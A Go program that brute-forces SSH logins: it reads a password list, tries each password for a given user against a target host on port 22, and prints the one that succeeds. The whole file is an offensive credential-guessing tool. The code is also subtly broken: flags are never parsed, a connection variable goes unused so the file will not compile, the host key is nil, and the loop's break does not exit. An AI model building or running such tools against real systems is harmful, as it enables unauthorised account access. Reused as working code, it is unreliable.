package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"

	ssh "golang.org/x/crypto/ssh"
)

func readLines(f *os.File) []string {
	// Read lines of the given file
	var lines []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines
}

func parseArgs() (string, string, []string) {

	var host, user, passwd string

	flag.StringVar(&host, "h", "", "Host to scan for")
	flag.StringVar(&user, "u", "", "User to brute force for")
	flag.StringVar(&passwd, "p", "", "Passwords file")

	if host == "" || user == "" || passwd == "" {
		panic("Usage scanner -h <host> -u <user> -p <passwd_file>")
	}

	f, err := os.Open(passwd)
	if err != nil {
		fmt.Println("Could not read from file!")
		panic(err)
	}
	defer f.Close()

	return host, user, readLines(f)
}

func tryPasswords(host, user string, passwdList []string) string {

	var hostKey ssh.PublicKey

	done := make(chan string, 10)
	answer := ""

	for _, pass := range passwdList {
		go func(pass string, done chan<- string) {
			fmt.Println("Trying password : " + pass)
			sshConfig := &ssh.ClientConfig{
				User:            user,
				HostKeyCallback: ssh.FixedHostKey(hostKey),
				Auth: []ssh.AuthMethod{
					ssh.Password(pass),
				},
			}
			conn, err := ssh.Dial("tcp", host+":22", sshConfig)
			if err != nil {
				done <- ""
			} else {
				done <- pass
			}
		}(pass, done)

		select {
		case val := <-done:
			if val != "" {
				answer = val
				break
			}
		}
	}
	return answer
}

func main() {
	host, user, passwdList := parseArgs()

	if answer := tryPasswords(host, user, passwdList); answer != "" {
		fmt.Println("Found password : " + answer)
	} else {
		fmt.Println("Count not find password!")
	}

}
